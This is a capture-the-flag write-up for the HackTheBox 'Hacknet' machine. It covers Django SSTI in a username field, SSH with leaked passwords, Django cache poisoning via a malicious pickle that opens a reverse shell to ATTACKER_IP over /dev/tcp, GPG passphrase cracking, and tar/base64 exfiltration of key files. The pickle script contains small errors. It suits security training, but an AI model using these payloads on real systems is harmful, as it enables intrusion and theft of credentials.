---
title: Hacknet
author: Julien Bongars
date: 2025-11
link: "[app.hackthebox.com/machines/Hacknet](https://app.hackthebox.com/machines/Hacknet)"
banner_path: ../hackthebox.png
tags:
  - HackTheBox
  - Medium
  - Linux
  - Hacking
---

# Hacknet — Writeup

> Platform: HackTheBox · Difficulty: **Medium** · OS: **Linux**
> Target: `10.129.232.4` (`hacknet.htb`)

## Summary

Hacknet is a **Medium** Linux box built around a Django social-network app. The app splits accounts into "main" users (searchable) and "hidden" users (IDs 25+, excluded from search with broken messaging), and a large amount of time can be lost probing SQLi, SSTI, upload RCE, CSRF, and path traversal that all lead nowhere.

The actual foothold is a **server-side template injection in the username field**: setting the username to `{{ users.values }}` renders the full user table — emails, usernames, and cleartext passwords — through the "likes" display. This leaks `deepdive` and, in turn, `backdoor_bandit` (`mikey`), whose password works over SSH despite the app's 2FA. That gives the user flag.

Privilege escalation chains three steps. First, `/var/www/HackNet/settings.py` leaks the MySQL creds for `sandy`, and the same file points at a **file-based Django cache** in a world-writable directory. Poisoning that cache with a malicious pickle yields RCE as **sandy** when the Explore page deserializes it. Second, sandy owns a directory of GPG-encrypted SQL backups; her private key is recovered from `~/.gnupg`, cracked with `gpg2john` + rockyou (`sweetheart`), and used to decrypt the backups. Finally, the decrypted backup logs contain a chat message where the **MySQL root password is shared in plaintext**, which is reused for root.

---

## Recon

### Website recon

The app is a Django-based social network (jQuery/AJAX form handling) behind nginx. Initial surface:

- Login page with username + password.
- Profile page with a file upload.
- A `csrfmiddlewaretoken` injected into each request — but it's only meaningfully validated on registration.
- Usernames are stored in a backing database (initial SQLi suspicion).

Behavioral notes gathered while poking the app:

- The **search** page doesn't appear injectable and returns `200` regardless of input (no error-based signal).
- Messaging is strange: creating a new user gave "bad credentials," then login worked but no other users (including the original) were visible.
- Able to log into `test@gmail` and `123@gmail`, but other users weren't visible.
- Editing the profile doesn't decode HTML-encoding (`%2F` stays literal).
- Posts from other users are visible, but posting a comment returns a `302` and renders the profile-page HTML under the comment section.
- Profile image can be updated (e.g. as a GIF).

### Possible attack vectors (initial)

- Image upload
- Registration page
- Comments on other people's accounts

### Directory brute force

```txt
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://hacknet.htb -c "csrftoken=0B2CZPErZ4ypt3xrB0mjFZWjA4JlpmNo; sessionid=jazlashdvvqmo3ofhfpqsnilfoazer3v" -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" -b "logout"
```

### Identifying own user ID

The contacts endpoint reveals the current account is `userId=27`:

```txt
GET /contacts?action=request&userId=27 HTTP/1.1
Host: hacknet.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://hacknet.htb/profile/7
Accept-Encoding: gzip, deflate, br
Cookie: csrftoken=anx3komXrXva92xRqdLt6FLa0EMLZtJT; sessionid=8zprwhphh6gelrzvfb1rqn8beap8qmfg
Connection: keep-alive
```

There are a few "hidden" users around IDs 25–30:

```
test@gmail.com = 27
123@gmail.com  = 30
```

The user ID is confirmed correct and the alt account was accepted as a contact, but messages still can't be sent between accounts even by forcing the API request.

### Additional recon

- nginx/1.22.1 (no known RCE vulns)
- Django-based app (likely using Django templates)
- AJAX handles form submissions (jQuery)

### User tiers

- **"Main users"** (IDs 1–24?): searchable, full functionality.
- **"Hidden users"** (IDs 25+): not in search results, messaging broken.
  - Search shows "page 1 no results" vs "no results found" for invalid users.
  - Friend requests work but messaging fails even when accepted.

### Tested & failed

- SQL injection on search (returns 200 regardless).
- SSTI payloads (`{{7*7}}`, Django/Jinja2 variants) in comments/profile.
- Image upload RCE (validates blob, preserves filename in `/media`).
- PHP shell upload (likely not a PHP backend).
- CSRF token bypass (tokens validated on registration only).
- Path traversal in article parameter.
- Profile enumeration via `/profile/1-10000` (found valid IDs).
- Template injection in comments, description, username.
- Default credentials (no email addresses known for main users).

### Observations

- `/media` preserves uploaded filenames.
- Comments POST returns `302` to `/profile`, response HTML prepended via AJAX.
- Login requires email but profiles show only username.
- No forgot/change password functionality.
- Main vs hidden user distinction appears intentional.

---

## Stage 1: SSTI in username → user data dump

> Note: this path was found with the help of an external walkthrough after
> the manual SSTI attempts above came up empty. The working injection is the
> username field, surfaced through the "likes" display rather than the fields
> tested earlier.

Setting the profile username to the following and then manipulating the likes reveals the details of users shown in the likes list:

```txt
username={{users.values}}
```

Filtering for emails on the `hacknet.htb` domain (the site's own admins), this dumps `deepdive`:

```txt
``{
'id': 22,
 'email': 'deepdive@hacknet.htb',
 'username': 'deepdive',
 'password': 'D33pD!v3r',
 'picture': '22.png',
 'about': 'Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.',
 'contact_requests': 0,
 'unread_messages': 0,
 'is_public': False,
 'is_hidden': False,
 'two_fa': True
},
`
```

Logging in as `deepdive` shows a single friend: `backdoor_bandit` — the next target.

Using the same technique, `backdoor_bandit`'s record is recovered:

```bash
{"id": 18, "email": "mikey@hacknet.htb", "username": "backdoor_bandit", "password": "mYd4rks1dEisH3re", "picture": "18.jpg", "about": "Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.", "contact_requests": 0, "unread_messages": 0, "is_public": False, "is_hidden": False, "two_fa": True}
```

---

## Stage 2: SSH as mikey (user flag)

The account has `two_fa: True`, but 2FA isn't enforced on SSH, so the leaked password logs straight in:

```bash
sshpass "mYd4rks1dEisH3re" ssh mikey@hacknet.htb
```

User flag:

```
/home/mikey/user.txt
```

---

## Stage 3: Django cache poisoning → shell as sandy

### Enumerating local services and creds

A MySQL socket exists at `/run/sqld/sqld.sock`. Useful enumeration:

```bash
ps aux
netstat -tunlp
lsof

# open sockets
lsof -U
```

`/var/www/Hacknet/settings.py` leaks sandy's DB password:

```py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}
```

Connect to MySQL:

```bash
# with sock
mysql -u sandy -p'h@ckn3tDBpa$$' -S /run/mysqld/mysqld.sock hacknet

# with tcp
mysql -u sandy -p'h@ckn3tDBpa$$' -h localhost -P 3306 hacknet
```

The Django `auth_user` table holds the admin's pbkdf2 hash:

```bash
MariaDB [hacknet]> select * from auth_user
    -> ;
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login                 | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= | 2025-02-05 17:01:02.503833 |            1 | admin    |            |           |       |        1 |         1 | 2024-08-08 18:17:54.472758 |
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
```

Set hashcat on it:

```txt
echo pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= > hash.txt
hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt.gz
```

The app's own user table dumps cleartext passwords for everyone:

```txt
MariaDB [hacknet]> select email,username,password from SocialNetwork_socialuser;
+------------------------------+--------------------+------------------+
| email                        | username           | password         |
+------------------------------+--------------------+------------------+
| cyberghost@darkmail.net      | cyberghost         | Gh0stH@cker2024  |
| hexhunter@ciphermail.com     | hexhunter          | H3xHunt3r!       |
| rootbreaker@exploitmail.net  | rootbreaker        | R00tBr3@ker#     |
| zero_day@hushmail.com        | zero_day           | Zer0D@yH@ck      |
| cryptoraven@securemail.org   | cryptoraven        | CrYptoR@ven42    |
| shadowcaster@darkmail.net    | shadowcaster       | Sh@d0wC@st!      |
| blackhat_wolf@cypherx.com    | blackhat_wolf      | Bl@ckW0lfH@ck    |
| bytebandit@exploitmail.net   | bytebandit         | Byt3B@nd!t123    |
| glitch@cypherx.com           | glitch             | Gl1tchH@ckz      |
| datadive@darkmail.net        | datadive           | D@taD1v3r        |
| phreaker@securemail.org      | phreaker           | Phre@k3rH@ck     |
| codebreaker@ciphermail.com   | codebreaker        | C0d3Br3@k!       |
| netninja@hushmail.com        | netninja           | N3tN1nj@2024     |
| packetpirate@exploitmail.net | packetpirate       | P@ck3tP!rat3     |
| darkseeker@darkmail.net      | darkseeker         | D@rkSeek3r#      |
| shadowmancer@cypherx.com     | shadowmancer       | Sh@d0wM@ncer     |
| trojanhorse@securemail.org   | trojanhorse        | Tr0j@nH0rse!     |
| mikey@hacknet.htb            | backdoor_bandit    | mYd4rks1dEisH3re |
| exploit_wizard@hushmail.com  | exploit_wizard     | Expl01tW!zard    |
| stealth_hawk@exploitmail.net | stealth_hawk       | St3@lthH@wk      |
| whitehat@darkmail.net        | whitehat           | Wh!t3H@t2024     |
| deepdive@hacknet.htb         | deepdive           | D33pD!v3r        |
| virus_viper@securemail.org   | virus_viper        | V!rusV!p3r2024   |
| brute_force@ciphermail.com   | brute_force        | BrUt3F0rc3#      |
| shadowwalker@hushmail.com    | shadowwalker       | Sh@dowW@lk2024   |
| mikey@hacknet.htb            | backdoor_bandit    | mYd4rks1dEisH3re |
| t@t.com                      | {{ users.values }} | t                |
+------------------------------+--------------------+------------------+
26 rows in set (0.000 sec)
```

This confirms known creds but doesn't add anything new — the DB isn't the escalation path.

### Cache poisoning (the real path)

> Note: the cache-poisoning idea came from an external walkthrough.

The key fact is **global write access to the Django cache**; poisoning a cached pickle yields a reverse shell. `settings.py` defines a file-based cache:

```python
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}
```

The cache directory `/var/tmp/django_cache` starts empty. Grep the app for where the cache is actually used:

```bash
find /var/www/HackNet -type f -name '*.py' | grep -Hn 'cache'
```

This points at the Explore page. Workflow: visit the Explore page to generate the legitimate cache entry, start a listener, then overwrite the cache file with a malicious pickle.

Listener:

```bash
nc -lvnp 4444
```

Generate the poisoned pickle (arbitrary code runs on deserialization via `__reduce__`):

```python
import pickle
import os
import hashlib
import time

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
        return (os.system, (cmd,))

# Generate a cache key (you might need to guess the right key format)
# Try common cache keys or just create multiple files
payload = pickle.dumps(RCE())

print("filename:", filename)

# Write to cache directory
with open(f'./poison.djcache', 'wb') as f:
    f.write(payload)
```

Move the poisoned pickle into place as the legitimate cache entry:

```bash
mv poisoned.djcache 983289483298243.djcache

ln -s poisoned.djcache <pickle>.djcachr
```

In a fresh incognito session, log in and browse to the same Explore page. This triggers deserialization of the poisoned cache and fires the reverse shell — landing as **sandy**.

---

## Stage 4: GPG backups → root

### Locating sandy's GPG key

`/var/www/HackNet/backups` contains GPG-encrypted SQL backups owned by sandy. The private key is needed to decrypt them. GPG keyring locations:

```bash
/home/sandy/.gnupg/pubring.kbx    # Public keys (newer format)
/home/sandy/.gnupg/secring.gpg    # Secret/private keys (old format)
/home/sandy/.gnupg/private-keys-v1.d/  # Private keys (newer format)
/home/sandy/.gnupg/pubring.gpg    # Public keys (old format)
```

Broader search for key material:

```bash
find / -type f -name '*.gpg' 2>/dev/null
find / -type f -name 'armored*' 2>/dev/null
```

Two files are found in `/home/sandy/.gnupg/private-keys-v1.d/`. Transfer them off-host safely via base64'd tar:

```bash
# on target
tar czf - ./ | base64

# on source
echo "PASTE_STRING_HERE" | base64 -d | tar xzf -
```

### Cracking the key passphrase

```bash
# Export the private key in a format John/Hashcat can crack
gpg2john /home/sandy/.gnupg/private-keys-v1.d/*.key > sandy_gpg.hash

# Or if you have the armored.asc file
gpg2john armored.asc > sandy_gpg.hash

# using john
john sandy_gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt

# using hashcat
hashcat -m 17010 sandy_gpg.hash /usr/share/wordlists/rockyou.txt
```

The passphrase cracks to `sweetheart`:

```bash
Sandy:sweetheart:::Sandy (My key for backups) <sandy@hacknet.htb>::armored_key.asc
```

### Decrypting the backups → root password

```bash
gpg --decrypt /var/www/HackNet/backups/backup01.sql.gpg > /var/www/HackNet/backups/backup01.sql
gpg --decrypt /var/www/HackNet/backups/backup02.sql.gpg > /var/www/HackNet/backups/backup02.sql
gpg --decrypt /var/www/HackNet/backups/backup03.sql.gpg > /var/www/HackNet/backups/backup03.sql

# prompt password is sweetheart
# (password we cracked earlier from armored_key.asc
```

The decrypted SQL contains a chat log where the MySQL root password is shared in plaintext:

```logs
sandy@hacknet:/var/www/HackNet/backups$ cat *.sql | grep password
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
```

Root password: `h4ck3rs4re3veRywh3re99`. Reuse it for root.

---

## Credentials

**SSTI dump (`deepdive`)** — `deepdive@hacknet.htb` / `D33pD!v3r`

**SSTI dump (`backdoor_bandit`)** — `mikey@hacknet.htb` / `mYd4rks1dEisH3re` → SSH as `mikey`

**`settings.py` (Django DB)** — `sandy` / `h@ckn3tDBpa$$` (MySQL)

**sandy GPG private key passphrase** — `sweetheart`

**Decrypted backup chat log** — MySQL root / `h4ck3rs4re3veRywh3re99` → root

---

## Key lessons

- **Timebox the obvious web bugs.** SQLi, SSTI on the tested fields, upload RCE, CSRF, and path traversal were all dead ends; the real SSTI lived in a field (username) surfaced through an unexpected sink (likes). When the common payloads all return clean, the vuln is often in _where_ output is rendered, not the input you first tried.
- **A "200 no matter what" response is a signal, not a wall.** The search page swallowing all input meant it wasn't the injection point — worth moving on from faster.
- **2FA in the DB ≠ 2FA on SSH.** `two_fa: True` on the app account didn't stop password auth over SSH. Always test recovered creds against every exposed service, not just the app they came from.
- **Read `settings.py` early on any Django box.** It handed over DB creds _and_ the cache backend/location that became the escalation path.
- **File-based Django cache + world-writable dir = pickle RCE.** `FileBasedCache` deserializes with pickle; write access to `LOCATION` means arbitrary code execution on the next cache read.
- **base64'd tar is a reliable exfil for key material** when you only have a shell: `tar czf - ./ | base64` out, `base64 -d | tar xzf -` back.
- **Secrets hide in backups.** The root password wasn't in any config — it was a throwaway line in a chat log inside an encrypted SQL dump. Decrypt and `grep` everything.

### What went right

- Web enumeration, user-tier discovery, and self-ID via the contacts endpoint were done independently before consulting anything external.
- Recovered `backdoor_bandit` and cracked the escalation chain (DB creds → MySQL → GPG key → backups) largely without help, using the walkthrough only for the two conceptual leaps (the `{{ users.values }}` sink and the cache-poisoning idea).
- Kept the exploit modular — confirmed each credential/shell before moving to the next hop.

---

## Tools & cheat sheet

- **`gobuster`** — Directory brute force (authenticated)
- **Burp / raw HTTP** — Enumerate contacts endpoint, confirm own userId
- [SSTI (`{{ users.values }}`)](/hacklas/enumeration/ssti/python-jinja2.md) — Dump user table via username → likes sink
- [`sshpass`](/hacklas/convenience/ssh/use-sshpass-so-ssh-does-not-prompt-for-password.md) — SSH with recovered password
- **`lsof` / `netstat` / `ps`** — Local service + socket enumeration
- [`mysql`](/hacklas/enumeration/sql/mysql.md) — Read Django DB via leaked sandy creds
- [`hashcat`](/hacklas/infiltration/cracking/hashcat.md) — Crack Django pbkdf2 admin hash
- **Python `pickle`** — Build poisoned Django cache entry
- [`nc`](/hacklas/infiltration/reverse-shell/nc.md) — Catch reverse shell from cache trigger
- [`tar` + `base64`](/hacklas/infiltration/dump/directory-with-nc.md) — Exfil GPG private keys over a shell
- **`gpg2john` + `john`** — Crack GPG key passphrase (`sweetheart`)
- **`gpg`** — Decrypt SQL backups
- **`grep`** — Find root password in decrypted backups
